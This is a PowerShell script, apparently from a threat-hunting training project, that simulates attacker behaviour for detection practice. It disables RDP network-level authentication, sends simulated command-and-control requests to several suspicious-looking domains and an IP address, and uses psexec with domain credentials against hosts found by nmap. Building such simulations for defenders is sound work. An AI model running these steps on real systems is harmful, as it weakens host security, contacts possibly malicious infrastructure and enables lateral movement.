# ThreatHunt by Milad Aslaner @MiladMSFT
#   _____  .__.__              .___ _____    _______________________________
#  /     \ |__|  | _____     __| _//     \  /   _____/\_   _____/\__    ___/
# /  \ /  \|  |  | \__  \   / __ |/  \ /  \ \_____  \  |    __)    |    |   
#/    Y    \  |  |__/ __ \_/ /_/ /    Y    \/        \ |     \     |    |   
#\____|__  /__|____(____  /\____ \____|__  /_______  / \___  /     |____|   
#        \/             \/      \/       \/        \/      \/               
# This project is not intended to cause any harm. However just in case, dont use it in production.
# Use at your own risk. There is no turning back. No option to pretend you didn't know what you do.
# ThreatHunt simulates dark magic so that folks can learn threat hunting.


# Enable Remote Desktop Connection
Write-Host "Enable option to do RDP without an authenticated user"
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)

# C2C communication
Write-Host "Some random C2C communication"
curl.exe --version twitterdocs.com
curl.exe --version msupdater.com
Invoke-WebRequest -URI msupdater.com -UseBasicParsing
Invoke-WebRequest -URI sydwl.cn -UseBasicParsing
Invoke-WebRequest -URI dwn.rundll32.ml -UseBasicParsing
Invoke-WebRequest -URI twitterdocs.com -UseBasicParsing
Invoke-WebRequest -URI www.aybc.so -UseBasicParsing
Invoke-WebRequest -URI a.ssvs.space -UseBasicParsing
Invoke-WebRequest -URI 118.24.150.172 -UseBasicParsing

# Grab available endpoints in network based on nmap scan and do psexec
Write-Host "Use nmap results to do some PSExec magic..."
$nmaplog = (Get-Content -Path $ThreatBox\logs\nmap.log | Where-Object {$_ -like '*Discovered open port*'})
$nmaplogip = ($nmaplog  |  Select-String -Pattern "\d{1,3}(\.\d{1,3}){3}" -AllMatches).Matches.Value
foreach ($nmapip in $nmaplogip) {
if (test-Connection -Cn $nmapip -quiet) {
    cd $ThreatBox\tools\pstools
    psexec \\$nmapip -u $domainUser -p $DomainPass PowerShell ipconfig
} else {
    "$nmapip is not available"
}
}